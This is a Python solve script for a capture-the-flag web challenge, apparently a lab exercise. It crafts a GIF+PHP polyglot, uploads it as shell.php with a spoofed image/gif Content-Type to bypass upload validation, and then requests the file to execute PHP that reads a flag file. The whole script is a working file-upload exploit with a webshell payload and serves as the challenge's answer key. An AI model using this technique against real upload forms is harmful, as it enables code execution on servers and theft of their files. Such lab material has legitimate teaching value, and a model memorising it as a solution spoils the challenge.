#!/usr/bin/env python3
"""
WEB-01 Solve Script: Polyglot File Upload
Crafts a GIF+PHP polyglot and uploads it to bypass Content-Type validation.
"""

import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8001"

# Craft polyglot: valid GIF header + PHP webshell
polyglot = b"GIF89a"  # GIF magic bytes
polyglot += b"<?php echo file_get_contents('/var/www/flag.txt'); ?>"

print(f"[*] Target: {TARGET}")
print(f"[*] Crafting GIF+PHP polyglot ({len(polyglot)} bytes)")

# Upload with spoofed Content-Type
files = {
    'file': ('shell.php', polyglot, 'image/gif')  # Content-Type says GIF, extension is .php
}

print("[*] Uploading polyglot file...")
r = requests.post(f"{TARGET}/index.php", files=files)

if "uploaded successfully" in r.text.lower() or r.status_code == 200:
    print("[+] Upload successful!")
else:
    print(f"[-] Upload may have failed: {r.status_code}")
    sys.exit(1)

# Trigger the PHP shell
print("[*] Triggering shell at /uploads/shell.php ...")
r = requests.get(f"{TARGET}/uploads/shell.php")

if "FLAG{" in r.text:
    flag = r.text.strip()
    print(f"[+] FLAG CAPTURED: {flag}")
else:
    print(f"[-] No flag in response. Got: {r.text[:200]}")
